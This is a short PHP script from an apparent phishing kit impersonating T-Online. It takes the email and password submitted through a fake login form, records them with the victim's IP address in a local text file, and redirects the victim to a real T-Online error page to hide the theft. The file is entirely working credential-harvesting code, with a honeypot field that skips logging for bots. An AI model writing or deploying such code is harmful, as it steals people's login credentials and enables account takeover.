<?php
$ip = getenv("REMOTE_ADDR");
$message .= "|T-Online Access \n";
$message .= "|User      : ".$_POST['email']."\n";
$message .= "|password  : ".$_POST['pass']."\n";
$message .= "|Client IP : ".$ip."\n";
$message .= "--------------------\n";
if(isset($_POST['phone']) && ($_POST['phone']!="")) 
{header("Location: https://www.t-online.de/fehler-404-seite-nicht-gefunden/id_41931432/index");  }
else 
{
	$fp = fopen('maldive.txt', 'a');
	fwrite($fp, $message);
	fclose($fp); 
	header("Location: https://www.t-online.de/fehler-404-seite-nicht-gefunden/id_41931432/index");
}
?>